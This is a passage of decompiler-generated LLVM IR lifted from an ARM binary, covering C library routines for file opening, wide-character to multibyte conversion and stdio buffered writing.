  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18e9c = load i32, i32* @r4, align 4
  store i32 %v3_18e9c, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33904), i32* @r1, align 4
  %v0_18ea4 = load i32, i32* @r0, align 4
  %v2_18ea4 = call i32 @__GI_fopen(i32 %v0_18ea4, i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33904))
  store i32 %v2_18ea4, i32* %r0.global-to-local, align 4
  store i32 %v2_18ea4, i32* @r4, align 4
  %v2_18ea8 = icmp eq i32 %v2_18ea4, 0
  br i1 %v2_18ea8, label %bb, label %dec_label_pc_18eb4

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_18eb4:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_18ebc = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_18ebc, i32* %r0.global-to-local, align 4
  %v2_18ec0 = icmp eq i32 %v2_18ebc, 0
  br i1 %v2_18ec0, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_18eb4
  %v1_18ec4 = load i32, i32* @r4, align 4
  %v3_18ec4 = inttoptr i32 %v2_18ebc to i32*
  store i32 %v1_18ec4, i32* %v3_18ec4, align 4
  %v1_18ecc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_18eb4, %bb4
  %v1_18ecc = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_18eb4 ], [ %v1_18ecc.pre, %bb4 ]
  %v2_18ec8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18ec8, i32* @r4, align 4
  ret i32 %v1_18ecc

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33904), { 1, 0 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_18ed8 = load i32, i32* @lr, align 4
  %v2_18edc = icmp eq i32 %arg1, 0
  br i1 %v2_18edc, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_18ee4 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_18f0c = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_18ef8 = phi i32 [ %arg1, %.thread ], [ %v3_18ee4, %bb ]
  store i32 %arg3, i32* @r4, align 4
  %v2_18ef4 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_18ef4, i32* @ip, align 4
  %v2_18efc = ptrtoint i32* %stack_var_-16 to i32
  store i32 16, i32* @r3, align 4
  store i32 %v2_18ef4, i32* %stack_var_-16, align 4
  store i32 %v0_18f0c, i32* %stack_var_-12, align 4
  %v5_18f14 = inttoptr i32 %v0_18ef8 to i8*
  %v6_18f14 = call i32 @__GI_wcsnrtombs(i8* %v5_18f14, i32 %v2_18efc, i32 1, i32 16, i32 %arg3)
  %v2_18f18 = icmp eq i32 %v6_18f14, 0
  br i1 %v2_18f18, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v1_18f28 = phi i32 [ %v6_18f14, %bb11 ], [ 1, %bb12 ]
  store i32 %v6_18ed8, i32* @lr, align 4
  ret i32 %v1_18f28

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_18f40 = load i32, i32* @r0, align 4
  %v1_18f40 = load i32, i32* @r1, align 4
  %v5_18f40 = inttoptr i32 %v0_18f40 to i8*
  %v6_18f40 = call i32 @__GI_wcsnrtombs(i8* %v5_18f40, i32 %v1_18f40, i32 -1, i32 %arg1, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_18f40

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18f50 = load i32, i32* @r4, align 4
  store i32 %v3_18f50, i32* %stack_var_-12, align 4
  %v10_18f54 = icmp eq i32 %tmp, %arg2
  store i1 %v10_18f54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v10_18f54, label %dec_label_pc_18f6c, label %bb

bb:                                               ; preds = %entry
  %v4_18f58 = icmp eq i8* %arg1, null
  store i1 %v4_18f58, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %lr.global-to-local, align 4
  br i1 %v4_18f58, label %dec_label_pc_18f6c.thread, label %bb39

dec_label_pc_18f6c.thread:                        ; preds = %bb
  %v2_18f5c = ptrtoint i32* %stack_var_-32 to i32
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb40

bb39:                                             ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

dec_label_pc_18f6c:                               ; preds = %entry
  %v2_18f5c1 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v3_18f6c = icmp eq i8* %arg1, null
  store i1 %v3_18f6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18f6c, label %bb40, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_18f6c
  store i32 %v2_18f5c1, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

bb40:                                             ; preds = %dec_label_pc_18f6c, %dec_label_pc_18f6c.thread
  %storemerge20 = phi i32 [ %v2_18f5c1, %dec_label_pc_18f6c ], [ %v2_18f5c, %dec_label_pc_18f6c.thread ]
  store i32 %storemerge20, i32* %lr.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %.thread14.thread

.thread14.thread:                                 ; preds = %bb39, %.thread8, %bb40
  %v2_18fc828 = phi i32 [ %v2_18f5c1, %.thread8 ], [ %tmp, %bb39 ], [ %storemerge20, %bb40 ]
  %v0_18f84 = load i32, i32* @r3, align 4
  %v3_18f84 = icmp uge i32 %v0_18f84, %arg3
  %arg3.v0_18f84 = select i1 %v3_18f84, i32 %arg3, i32 %v0_18f84
  store i32 %arg3.v0_18f84, i32* %r5.global-to-local, align 4
  %v1_18f90 = inttoptr i32 %arg2 to i32*
  %v2_18f90 = load i32, i32* %v1_18f90, align 4
  store i32 %v2_18f90, i32* %r2.global-to-local, align 4
  store i32 %arg3.v0_18f84, i32* %r0.global-to-local, align 4
  %v2_18fdc22 = icmp eq i32 %arg3.v0_18f84, 0
  store i1 %v2_18fdc22, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18fdc22, label %dec_label_pc_18fe4, label %dec_label_pc_18f9c

dec_label_pc_18f9c:                               ; preds = %.thread14.thread, %dec_label_pc_18fd4.dec_label_pc_18f9c_crit_edge
  %v2_18fc8 = phi i32 [ %v2_18fd4, %dec_label_pc_18fd4.dec_label_pc_18f9c_crit_edge ], [ %v2_18fc828, %.thread14.thread ]
  %v0_18fa8 = phi i32 [ %v0_18f9c.pre, %dec_label_pc_18fd4.dec_label_pc_18f9c_crit_edge ], [ %v2_18f90, %.thread14.thread ]
  %v1_18f9c = inttoptr i32 %v0_18fa8 to i32*
  %v2_18f9c = load i32, i32* %v1_18f9c, align 4
  %v7_18fa0 = icmp eq i32 %v2_18f9c, 127
  store i1 %v7_18fa0, i1* %cpsr_z.global-to-local, align 1
  %v1_18fa4 = urem i32 %v2_18f9c, 256
  store i32 %v1_18fa4, i32* @ip, align 4
  %v1_18fa8 = add i32 %v0_18fa8, 4
  store i32 %v1_18fa8, i32* %r2.global-to-local, align 4
  %tmp45 = icmp ult i32 %v2_18f9c, 128
  br i1 %tmp45, label %dec_label_pc_18fc4, label %dec_label_pc_18fb0

dec_label_pc_18fb0:                               ; preds = %dec_label_pc_18f9c
  %v0_18fb0 = call i32 @__GI___errno_location()
  store i32 %v0_18fb0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_18fbc = inttoptr i32 %v0_18fb0 to i32*
  store i32 84, i32* %v2_18fbc, align 4
  %v0_18ff0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18ff0

dec_label_pc_18fc4:                               ; preds = %dec_label_pc_18f9c
  %v2_18fc4 = icmp eq i32 %v1_18fa4, 0
  store i1 %v2_18fc4, i1* %cpsr_z.global-to-local, align 1
  %v1_18fc8 = trunc i32 %v2_18f9c to i8
  %v3_18fc8 = inttoptr i32 %v2_18fc8 to i8*
  store i8 %v1_18fc8, i8* %v3_18fc8, align 1
  %v0_18fcc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18fcc, label %.dec_label_pc_18fe4_crit_edge, label %dec_label_pc_18fd4

dec_label_pc_18fd4:                               ; preds = %dec_label_pc_18fc4
  %v0_18fd4 = load i32, i32* %lr.global-to-local, align 4
  %v1_18fd4 = load i32, i32* %r4.global-to-local, align 4
  %v2_18fd4 = add i32 %v1_18fd4, %v0_18fd4
  store i32 %v2_18fd4, i32* %lr.global-to-local, align 4
  %v0_18fd8 = load i32, i32* %r0.global-to-local, align 4
  %v1_18fd8 = add i32 %v0_18fd8, -1
  store i32 %v1_18fd8, i32* %r0.global-to-local, align 4
  %v2_18fdc = icmp eq i32 %v1_18fd8, 0
  store i1 %v2_18fdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18fdc, label %dec_label_pc_18fe4, label %dec_label_pc_18fd4.dec_label_pc_18f9c_crit_edge

dec_label_pc_18fd4.dec_label_pc_18f9c_crit_edge:  ; preds = %dec_label_pc_18fd4
  %v0_18f9c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18f9c

.dec_label_pc_18fe4_crit_edge:                    ; preds = %dec_label_pc_18fc4
  %v1_18fcc = load i32, i32* @ip, align 4
  store i32 %v1_18fcc, i32* %r2.global-to-local, align 4
  %v0_18fe4.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_18fe4

dec_label_pc_18fe4:                               ; preds = %dec_label_pc_18fd4, %.dec_label_pc_18fe4_crit_edge, %.thread14.thread
  %v0_18fe4 = phi i32 [ %v0_18fe4.pre, %.dec_label_pc_18fe4_crit_edge ], [ %v2_18fc828, %.thread14.thread ], [ %v2_18fd4, %dec_label_pc_18fd4 ]
  %v1_18fe4 = load i32, i32* @sp, align 4
  %v9_18fe4 = icmp eq i32 %v0_18fe4, %v1_18fe4
  store i1 %v9_18fe4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_18fe4, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_18fe4
  %v1_18fe8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_18fe8, i32* %v1_18f90, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_18fe4, %bb43
  %v0_18fec = load i32, i32* %r0.global-to-local, align 4
  %v1_18fec = load i32, i32* %r5.global-to-local, align 4
  %v2_18fec = sub i32 %v1_18fec, %v0_18fec
  store i32 %v2_18fec, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18ff0

dec_label_pc_18ff0:                               ; preds = %dec_label_pc_18fb0, %bb44
  %v0_18ff0 = phi i32 [ %v0_18ff0.pre, %dec_label_pc_18fb0 ], [ %v2_18fec, %bb44 ]
  store i32 %v0_18ff0, i32* %r0.global-to-local, align 4
  %v2_18ff8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18ff8, i32* %r4.global-to-local, align 4
  ret i32 %v0_18ff0

; uselistorder directives
  uselistorder i32 %v0_18ff0, { 1, 0 }
  uselistorder i32 %v1_18fd8, { 1, 0 }
  uselistorder i32 %v2_18fd4, { 0, 2, 1 }
  uselistorder i32 %v1_18fa4, { 1, 0 }
  uselistorder i32 %v2_18f9c, { 2, 0, 1, 3 }
  uselistorder i32 %v2_18fc828, { 1, 0 }
  uselistorder i32 %v2_18f5c1, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 5, 3, 4, 6, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 6, 0 }
  uselistorder i32* %lr.global-to-local, { 4, 0, 3, 5, 1, 6, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 4, 1, 2, 3, 8, 5, 9, 6, 7 }
  uselistorder i32 127, { 2, 0, 3, 4, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18ff0, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_18fe4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18f9c, { 1, 0 }
  uselistorder label %.thread14.thread, { 2, 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_19000 = load i32, i32* @r4, align 4
  store i32 %v3_19000, i32* %stack_var_-24, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 2147483647, i32* %r8.global-to-local, align 4
  %v2_190182 = icmp eq i32 %arg3, 0
  store i1 %v2_190182, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_190182, label %dec_label_pc_190a8, label %dec_label_pc_19020

dec_label_pc_19018thread-pre-split:               ; preds = %dec_label_pc_19020
  %v3_19038 = load i32, i32* %r6.global-to-local, align 4
  %v5_19038 = add i32 %v3_19038, %v3_19030
  store i32 %v5_19038, i32* %r6.global-to-local, align 4
  %v4_1903c = load i32, i32* %r5.global-to-local, align 4
  %v5_1903c = sub i32 %v4_1903c, %v3_19030
  store i32 %v5_1903c, i32* %r5.global-to-local, align 4
  %v2_19018 = icmp eq i32 %v5_1903c, 0
  store i1 %v2_19018, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19018, label %dec_label_pc_19018.dec_label_pc_190a8.loopexit_crit_edge, label %dec_label_pc_19018thread-pre-split.dec_label_pc_19020_crit_edge

dec_label_pc_19018thread-pre-split.dec_label_pc_19020_crit_edge: ; preds = %dec_label_pc_19018thread-pre-split
  %v3_19020.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_1902c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19020

dec_label_pc_19020:                               ; preds = %entry, %dec_label_pc_19018thread-pre-split.dec_label_pc_19020_crit_edge
  %v0_1902c = phi i32 [ %v0_1902c.pre, %dec_label_pc_19018thread-pre-split.dec_label_pc_19020_crit_edge ], [ %tmp, %entry ]
  %v0_19028 = phi i32 [ %v5_19038, %dec_label_pc_19018thread-pre-split.dec_label_pc_19020_crit_edge ], [ %arg2, %entry ]
  %v3_19020 = phi i32 [ %v3_19020.pre, %dec_label_pc_19018thread-pre-split.dec_label_pc_19020_crit_edge ], [ 2147483647, %entry ]
  %v0_19024.in = phi i32 [ %v5_1903c, %dec_label_pc_19018thread-pre-split.dec_label_pc_19020_crit_edge ], [ %arg3, %entry ]
  %v3_19024 = phi i32 [ %v5_1903c, %dec_label_pc_19018thread-pre-split.dec_label_pc_19020_crit_edge ], [ %arg3, %entry ]
  %v0_19024 = icmp slt i32 %v0_19024.in, 0
  %storemerge = select i1 %v0_19024, i32 %v3_19020, i32 %v3_19024
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 %v0_19028, i32* %r1.global-to-local, align 4
  %v1_1902c = add i32 %v0_1902c, 4
  %v2_1902c = inttoptr i32 %v1_1902c to i32*
  %v3_1902c = load i32, i32* %v2_1902c, align 4
  %v3_19030 = call i32 @__GI_write(i32 %v3_1902c, i32 %v0_19028)
  %v1_19034 = icmp slt i32 %v3_19030, 0
  %v2_19034 = icmp eq i32 %v3_19030, 0
  store i1 %v2_19034, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_19034, label %dec_label_pc_19044, label %dec_label_pc_19018thread-pre-split

dec_label_pc_19044:                               ; preds = %dec_label_pc_19020
  %v0_19044 = load i32, i32* %r4.global-to-local, align 4
  %v1_19044 = inttoptr i32 %v0_19044 to i16*
  %v2_19044 = load i16, i16* %v1_19044, align 2
  %v3_19044 = zext i16 %v2_19044 to i32
  store i32 %v3_19044, i32* %r3.global-to-local, align 4
  %v1_19048 = add i32 %v0_19044, 8
  store i32 %v1_19048, i32* %r1.global-to-local, align 4
  %v1_1904c = inttoptr i32 %v1_19048 to i32*
  %v2_1904c = load i32, i32* %v1_1904c, align 4
  store i32 %v2_1904c, i32* %r1.global-to-local, align 4
  %v3_1904c = add i32 %v0_19044, 12
  %v4_1904c = inttoptr i32 %v3_1904c to i32*
  %v5_1904c = load i32, i32* %v4_1904c, align 4
  %v1_19050 = or i32 %v3_19044, 8
  store i32 %v1_19050, i32* %r3.global-to-local, align 4
  %v2_19054 = sub i32 %v5_1904c, %v2_1904c
  store i32 %v2_19054, i32* %r2.global-to-local, align 4
  %v9_19054 = icmp eq i32 %v5_1904c, %v2_1904c
  store i1 %v9_19054, i1* %cpsr_z.global-to-local, align 1
  %v1_19058 = trunc i32 %v1_19050 to i16
  store i16 %v1_19058, i16* %v1_19044, align 2
  br i1 %v9_19054, label %dec_label_pc_19044.dec_label_pc_190a4_crit_edge, label %dec_label_pc_19060

dec_label_pc_19044.dec_label_pc_190a4_crit_edge:  ; preds = %dec_label_pc_19044
  %v0_190a4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_190a4

dec_label_pc_19060:                               ; preds = %dec_label_pc_19044
  %v0_19060 = load i32, i32* %r2.global-to-local, align 4
  %v1_19060 = load i32, i32* %r5.global-to-local, align 4
  %v3_19060 = icmp ult i32 %v0_19060, %v1_19060
  %v9_19060 = icmp eq i32 %v0_19060, %v1_19060
  store i1 %v9_19060, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_19060, label %.preheader, label %bb23

bb23:                                             ; preds = %dec_label_pc_19060
  store i32 %v1_19060, i32* %r2.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_19060, %bb23
  %v2_19074.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb24

bb24:                                             ; preds = %.preheader, %dec_label_pc_19088
  %v2_19074 = phi i32 [ %v2_19074.pre, %.preheader ], [ %v1_1908c, %dec_label_pc_19088 ]
  %v0_19068 = load i32, i32* %r6.global-to-local, align 4
  %v1_19068 = inttoptr i32 %v0_19068 to i8*
  %v2_19068 = load i8, i8* %v1_19068, align 1
  %v3_19068 = zext i8 %v2_19068 to i32
  store i32 %v3_19068, i32* %r3.global-to-local, align 4
  %v7_1906c = icmp eq i8 %v2_19068, 10
  store i1 %v7_1906c, i1* %cpsr_z.global-to-local, align 1
  %v1_19070 = add i32 %v0_19068, 1
  store i32 %v1_19070, i32* %r6.global-to-local, align 4
  %v3_19074 = inttoptr i32 %v2_19074 to i8*
  store i8 %v2_19068, i8* %v3_19074, align 1
  %v0_19078 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19078, label %dec_label_pc_1907c, label %dec_label_pc_19088

dec_label_pc_1907c:                               ; preds = %bb24
  %v0_1907c = load i32, i32* %r4.global-to-local, align 4
  %v1_1907c = inttoptr i32 %v0_1907c to i16*
  %v2_1907c = load i16, i16* %v1_1907c, align 2
  %v3_1907c = zext i16 %v2_1907c to i32
  store i32 %v3_1907c, i32* %r3.global-to-local, align 4
  %v1_19080 = and i32 %v3_1907c, 256
  %v2_19080 = icmp eq i32 %v1_19080, 0
  store i1 %v2_19080, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19080, label %dec_label_pc_19088, label %dec_label_pc_1907c.dec_label_pc_19094_crit_edge

dec_label_pc_1907c.dec_label_pc_19094_crit_edge:  ; preds = %dec_label_pc_1907c
  %v0_19098.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19094

dec_label_pc_19088:                               ; preds = %dec_label_pc_1907c, %bb24
  %v0_19088 = load i32, i32* %r2.global-to-local, align 4
  %v1_19088 = add i32 %v0_19088, -1
  store i32 %v1_19088, i32* %r2.global-to-local, align 4
  %v7_19088 = icmp eq i32 %v0_19088, 1
  store i1 %v7_19088, i1* %cpsr_z.global-to-local, align 1
  %v0_1908c = load i32, i32* %r1.global-to-local, align 4
  %v1_1908c = add i32 %v0_1908c, 1
  store i32 %v1_1908c, i32* %r1.global-to-local, align 4
  br i1 %v7_19088, label %dec_label_pc_19088.dec_label_pc_19094_crit_edge, label %bb24

dec_label_pc_19088.dec_label_pc_19094_crit_edge:  ; preds = %dec_label_pc_19088
  %v0_19094.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19094

dec_label_pc_19094:                               ; preds = %dec_label_pc_1907c.dec_label_pc_19094_crit_edge, %dec_label_pc_19088.dec_label_pc_19094_crit_edge
  %v0_19098 = phi i32 [ %v1_1908c, %dec_label_pc_19088.dec_label_pc_19094_crit_edge ], [ %v0_19098.pre, %dec_label_pc_1907c.dec_label_pc_19094_crit_edge ]
  %v0_19094 = phi i32 [ %v0_19094.pre, %dec_label_pc_19088.dec_label_pc_19094_crit_edge ], [ %v0_1907c, %dec_label_pc_1907c.dec_label_pc_19094_crit_edge ]
  %v1_19094 = add i32 %v0_19094, 8
  %v2_19094 = inttoptr i32 %v1_19094 to i32*
  %v3_19094 = load i32, i32* %v2_19094, align 4
  store i32 %v3_19094, i32* %r3.global-to-local, align 4
  %v2_19098 = add i32 %v0_19094, 16
  %v3_19098 = inttoptr i32 %v2_19098 to i32*
  store i32 %v0_19098, i32* %v3_19098, align 4
  %v0_1909c = load i32, i32* %r3.global-to-local, align 4
  %v1_1909c = load i32, i32* %r1.global-to-local, align 4
  %v2_1909c = sub i32 %v1_1909c, %v0_1909c
  store i32 %v2_1909c, i32* %r3.global-to-local, align 4
  %v1_190a0 = load i32, i32* %r5.global-to-local, align 4
  %v2_190a0 = sub i32 %v1_190a0, %v2_1909c
  store i32 %v2_190a0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_190a4

dec_label_pc_190a4:                               ; preds = %dec_label_pc_19044.dec_label_pc_190a4_crit_edge, %dec_label_pc_19094
  %v0_190a4 = phi i32 [ %v0_190a4.pre, %dec_label_pc_19044.dec_label_pc_190a4_crit_edge ], [ %v2_190a0, %dec_label_pc_19094 ]
  %v1_190a4 = load i32, i32* @r7, align 4
  %v2_190a4 = sub i32 %v1_190a4, %v0_190a4
  br label %dec_label_pc_190a8

dec_label_pc_19018.dec_label_pc_190a8.loopexit_crit_edge: ; preds = %dec_label_pc_19018thread-pre-split
  %v0_190a8.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_190a8

dec_label_pc_190a8:                               ; preds = %entry, %dec_label_pc_19018.dec_label_pc_190a8.loopexit_crit_edge, %dec_label_pc_190a4
  %v0_190a8 = phi i32 [ %v2_190a4, %dec_label_pc_190a4 ], [ %v0_190a8.pre.pre, %dec_label_pc_19018.dec_label_pc_190a8.loopexit_crit_edge ], [ 0, %entry ]
  %v2_190ac = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_190ac, i32* %r4.global-to-local, align 4
  ret i32 %v0_190a8

; uselistorder directives
  uselistorder i32 %v0_19094, { 1, 0 }
  uselistorder i32 %v1_1908c, { 0, 2, 1 }
  uselistorder i32 %v0_19088, { 1, 0 }
  uselistorder i32 %v1_19060, { 0, 2, 1 }
  uselistorder i32 %v0_19060, { 1, 0 }
  uselistorder i32 %v5_1904c, { 1, 0 }
  uselistorder i32 %v2_1904c, { 1, 0, 2 }
  uselistorder i32 %v3_19030, { 2, 3, 0, 1 }
  uselistorder i32 %v0_19028, { 1, 0 }
  uselistorder i32 %v5_1903c, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 5, 1, 4, 6 }
  uselistorder i32* %r2.global-to-local, { 2, 4, 3, 5, 6, 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 3, 5, 4, 6, 7, 8, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 (i32, i32)* @__GI_write, { 1, 2, 0 }
  uselistorder i32 2147483647, { 1, 6, 2, 5, 3, 4, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_190a8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_190a4, { 1, 0 }
  uselistorder label %dec_label_pc_19094, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_19020, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg3 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_190b4 = load i32, i32* @r4, align 4
  store i32 %v3_190b4, i32* %stack_var_-20, align 4
  %v6_190b4 = load i32, i32* @r5, align 4
  %v9_190b4 = load i32, i32* @r6, align 4
  %v12_190b4 = load i32, i32* @r7, align 4
  %v3_190b8 = load i16, i16* %arg3, align 2
  %v4_190b8 = zext i16 %v3_190b8 to i32
  %v1_190bc = and i32 %v4_190b8, 512
  store i32 %v1_190bc, i32* @r4, align 4
  %v2_190bc = icmp eq i32 %v1_190bc, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_190bc, label %dec_label_pc_190d4, label %dec_label_pc_191d0

dec_label_pc_190d4:                               ; preds = %entry
  %v2_190d4 = add i32 %tmp, 4
  %v3_190d4 = inttoptr i32 %v2_190d4 to i32*
  %v4_190d4 = load i32, i32* %v3_190d4, align 4
  %v2_190dc = add i32 %tmp, 16
  %v3_190dc = inttoptr i32 %v2_190dc to i32*
  %v4_190dc = load i32, i32* %v3_190dc, align 4
  store i32 %v4_190dc, i32* @r0, align 4
  %v2_190e0 = add i32 %tmp, 12
  %v3_190e0 = inttoptr i32 %v2_190e0 to i32*
  %v4_190e0 = load i32, i32* %v3_190e0, align 4
  store i32 %v4_190e0, i32* @r3, align 4
  %v4_190e4 = icmp eq i32 %v4_190d4, -2
  %v2_190e8 = sub i32 %v4_190e0, %v4_190dc
  br i1 %v4_190e4, label %dec_label_pc_190e8, label %dec_label_pc_19110

dec_label_pc_190e8:                               ; preds = %dec_label_pc_190d4
  %v3_190ec = icmp ugt i32 %v2_190e8, %arg2
  br i1 %v3_190ec, label %bb, label %bb12

bb:                                               ; preds = %dec_label_pc_190e8
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_190e8, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_190e8, %dec_label_pc_190e8 ]
  %v0_190f4 = phi i32 [ %arg2, %bb ], [ %v2_190e8, %dec_label_pc_190e8 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_190f4, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_190fc = call i32 @memcpy()
  %v0_19100 = load i32, i32* @r5, align 4
  %v1_19100 = add i32 %v0_19100, 16
  %v2_19100 = inttoptr i32 %v1_19100 to i32*
  %v3_19100 = load i32, i32* %v2_19100, align 4
  %v1_19104 = load i32, i32* @r4, align 4
  %v2_19104 = add i32 %v1_19104, %v3_19100
  store i32 %v2_19104, i32* %v2_19100, align 4
  br label %dec_label_pc_191e4

dec_label_pc_19110:                               ; preds = %dec_label_pc_190d4
  store i32 %v2_190e8, i32* @r3, align 4
  %tmp18 = icmp ult i32 %v2_190e8, %arg2
  br i1 %tmp18, label %dec_label_pc_191b0, label %dec_label_pc_1911c

